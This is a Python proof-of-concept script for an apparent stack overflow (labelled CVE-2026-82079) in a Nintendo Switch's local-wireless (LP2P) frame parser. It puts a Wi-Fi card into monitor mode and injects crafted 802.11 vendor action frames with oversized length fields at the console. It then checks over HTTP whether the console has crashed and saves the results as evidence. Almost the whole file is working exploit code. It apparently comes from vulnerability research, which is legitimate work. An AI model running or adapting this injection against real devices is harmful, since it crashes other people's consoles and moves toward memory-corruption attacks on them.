#!/usr/bin/env -S python3 -u -I
"""Validated differential probe for CVE-2026-82079.

Uses monitor-mode TX injection (not nl80211 CMD_FRAME which fails on STA).
Must be run WHILE connected to the Switch's LP2P AP for HTTP liveness checks.

Workflow:
1. Connect to Switch AP: nmcli device wifi connect <SSID> password <pass>
2. Run this script: sudo python3 -I validated_probe.py
3. Script: saves STA state, switches to monitor, injects, switches back, checks HTTP

IMPORTANT:
- Each test cycle disconnects/reconnects WiFi (takes ~5-10s)
- iwlwifi monitor TX is not guaranteed to work (firmware dependent)
- Verify TX with a second radio in monitor mode if possible
"""

import argparse
import json
import os
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
SWITCH_CHANNEL = 1
SWITCH_IP = "192.168.0.1"
SWITCH_PORT = 80
EVIDENCE_DIR = str(_LDN_ROOT / "evidence" / "validated_probe")


def run(cmd, check=False):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)


def check_alive(timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((SWITCH_IP, SWITCH_PORT))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=60):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def reconnect_switch(ssid, password, timeout=30):
    """Reconnect to the Switch's LP2P AP."""
    run(f"nmcli device wifi connect '{ssid}' password '{password}'")
    start = time.time()
    while time.time() - start < timeout:
        r = run(f"iw dev {IFACE} link")
        if ssid in r.stdout:
            time.sleep(2)  # Wait for IP
            return True
        time.sleep(1)
    return False


def inject_in_monitor(channel, frames, count=10, delay=0.01):
    """Switch to monitor mode, inject frames, switch back."""
    run(f"ip link set {IFACE} down")
    run(f"iw dev {IFACE} set type monitor")
    run(f"ip link set {IFACE} up")
    run(f"iw dev {IFACE} set channel {channel}")
    time.sleep(0.5)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    sock.bind((IFACE, 0))

    radiotap = bytes([0x00, 0x00, 0x0d, 0x00, 0x00, 0x80, 0x02, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00])

    sent = 0
    errors = 0
    for _ in range(count):
        for frame in frames:
            pkt = radiotap + frame
            try:
                sock.send(pkt)
                sent += 1
            except OSError:
                errors += 1
        time.sleep(delay)

    sock.close()

    # Restore managed mode
    run(f"ip link set {IFACE} down")
    run(f"iw dev {IFACE} set type managed")
    run(f"ip link set {IFACE} up")

    return sent, errors


def build_frame(size_field, fill=0x41, body_size=0x800):
    """Build a complete 802.11 action frame."""
    # Action frame body
    body = bytearray(body_size)
    body[0] = 0x7f  # vendor-specific action
    body[1:4] = b"\x00\x22\xaa"  # OUI: LP2P
    body[4] = 0x04  # OUI type
    body[5] = 0x01
    body[6] = 0x01
    body[7] = 0x01

    body[0x21] = 0x03  # type 3 parser
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01

    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, size_field)

    for i in range(0x5C, body_size):
        body[i] = fill

    # 802.11 header
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)  # Action
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += body
    return bytes(frame)


def run_test(ssid, password, name, size_field, fill, count=60):
    """Run one injection test with validation."""
    print(f"\n{'='*60}")
    print(f"TEST: {name}")
    print(f"  size_field=0x{size_field:04X}, fill=0x{fill:02X}, count={count}")
    print(f"{'='*60}")

    # Verify Switch is alive before test
    if not check_alive():
        print("  Switch not reachable. Reconnecting...")
        if not reconnect_switch(ssid, password):
            print("  FAILED to reconnect")
            return {"result": "RECONNECT_FAIL"}
        if not wait_alive(30):
            print("  Switch not responding after reconnect")
            return {"result": "PRE_TIMEOUT"}

    print("  Switch alive. Injecting...")

    frame = build_frame(size_field, fill)
    sent, errors = inject_in_monitor(SWITCH_CHANNEL, [frame], count=count)
    print(f"  Injected: {sent} sent, {errors} errors")

    # Reconnect and check
    print("  Reconnecting to Switch AP...")
    if not reconnect_switch(ssid, password, timeout=30):
        return {
            "result": "RECONNECT_FAIL_POST",
            "sent": sent, "errors": errors,
            "note": "Could not reconnect after injection"
        }

    time.sleep(3)

    alive = check_alive()
    print(f"  Switch alive after: {alive}")

    if not alive:
        time.sleep(10)
        alive2 = check_alive()
        result = "UNAVAIL_PERSISTENT" if not alive2 else "UNAVAIL_DELAYED_RECOVER"
    else:
        result = "OK"

    print(f"  RESULT: {result}")
    return {
        "result": result,
        "sent": sent,
        "errors": errors,
        "size_field": f"0x{size_field:04X}",
        "fill": f"0x{fill:02X}",
    }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ssid", required=True, help="Switch LP2P AP SSID")
    parser.add_argument("--password", required=True, help="AP password")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("ERROR: Must run as root")
        sys.exit(1)

    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    tests = [
        ("baseline_safe", 0x0100, 0x41, "size=256 (safe, baseline)"),
        ("at_threshold",  0x0720, 0x41, "size=1824 (at threshold, no overflow)"),
        ("over_1byte",    0x0721, 0x41, "size=1825 (1 byte OVER threshold!)"),
        ("over_224bytes", 0x0800, 0x41, "size=2048 (224 bytes over)"),
    ]

    results = {}
    for name, size_field, fill, desc in tests:
        print(f"\n{desc}")
        result = run_test(args.ssid, args.password, desc, size_field, fill)
        results[name] = result

        if "UNAVAIL" in result.get("result", ""):
            print("  Waiting for recovery...")
            time.sleep(30)
            reconnect_switch(args.ssid, args.password)
            wait_alive(60)

    print("\n" + "="*60)
    print("SUMMARY")
    print("="*60)
    for name, info in results.items():
        tx = info.get("sent", "?")
        err = info.get("errors", "?")
        print(f"  {name}: {info['result']} (sent={tx}, errors={err})")

    baseline = results.get("baseline_safe", {}).get("result")
    over1 = results.get("over_1byte", {}).get("result")

    print("\nINTERPRETATION:")
    if baseline == "OK" and over1 and "UNAVAIL" in over1:
        print("  CONFIRMED: Stack overflow threshold triggers crash!")
    elif baseline == "OK" and over1 == "OK":
        print("  NOT CONFIRMED: No differential effect at threshold.")
    else:
        print(f"  INCONCLUSIVE: baseline={baseline}, over_1byte={over1}")

    all_errors = all(r.get("errors", 0) > 0 and r.get("sent", 1) == 0
                     for r in results.values())
    if all_errors:
        print("  WARNING: All frames had TX errors — monitor TX may not be supported!")
        print("  Try: different WiFi card, or check iwlwifi TX injection support.")

    evidence_path = os.path.join(EVIDENCE_DIR, "validated_probe.json")
    with open(evidence_path, 'w') as f:
        json.dump({
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "test": "validated_differential_probe",
            "method": "monitor-mode radiotap TX injection",
            "threshold": "0x720 (1824 bytes)",
            "results": results,
        }, f, indent=2)
    print(f"\nEvidence saved to {evidence_path}")


if __name__ == "__main__":
    main()
